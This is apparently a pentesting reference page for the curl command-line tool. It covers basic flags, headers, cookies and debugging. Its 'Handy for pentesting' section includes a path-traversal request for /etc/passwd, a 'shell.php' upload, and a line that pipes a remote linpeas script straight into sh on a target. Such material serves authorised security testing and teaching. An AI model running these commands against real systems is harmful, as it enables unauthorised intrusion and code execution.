---
name: curl
category: Utilities & Shell
description: Transfer data over HTTP and many protocols — the CLI HTTP workhorse.
tags: [curl, http, api, request, transfer, download]
---

# curl

**curl** sends and receives data over HTTP(S) and dozens of other protocols. In security work it's how you poke APIs, replay requests, download tools onto a target, and test endpoints without a browser.

> installed almost everywhere · `apt install curl`

## Basics

```bash
curl https://example.com                 # print the body
curl -s https://example.com               # silent (no progress meter)
curl -i https://example.com               # include response headers
curl -I https://example.com               # headers only (HEAD)
curl -L https://example.com               # follow redirects
curl -o out.html https://example.com      # save to file (-O keeps remote name)
curl -v https://example.com               # verbose (see the full exchange)
```

## Methods, data, headers

```bash
curl -X POST -d 'user=admin&pass=1' https://alvo/login
curl -X POST -H 'Content-Type: application/json' -d '{"id":1}' https://alvo/api
curl -H 'Authorization: Bearer TOKEN' https://alvo/api/me
curl -b 'session=abc' https://alvo/            # send a cookie
curl -c jar.txt -b jar.txt https://alvo/        # save + reuse a cookie jar
curl -u user:pass https://alvo/                 # HTTP basic auth
curl -F 'file=@shell.php' https://alvo/upload    # multipart file upload
```

## Handy for pentesting

```bash
curl -sk https://alvo/                          # -k: ignore TLS cert errors
curl -x http://127.0.0.1:8080 https://alvo/      # route through Burp
curl --path-as-is 'https://alvo/../../etc/passwd'
curl -s https://alvo/ | grep -oE 'href="[^"]+"'   # scrape links
# pull a tool onto a target and run it in memory:
curl -s http://10.0.0.99/linpeas.sh | sh
```

## Timing / debugging

```bash
curl -s -o /dev/null -w '%{http_code} %{time_total}s\n' https://alvo/
curl --resolve alvo.com:443:10.0.0.5 https://alvo.com/   # override DNS (vhost testing)
```

> The everyday HTTP tool; for structured JSON responses pipe into [jq](#/tool/jq). To route through a SOCKS pivot, prefix with [proxychains](#/tool/proxychains) or use `--socks5`. For raw TCP instead of HTTP, [netcat](#/tool/netcat).
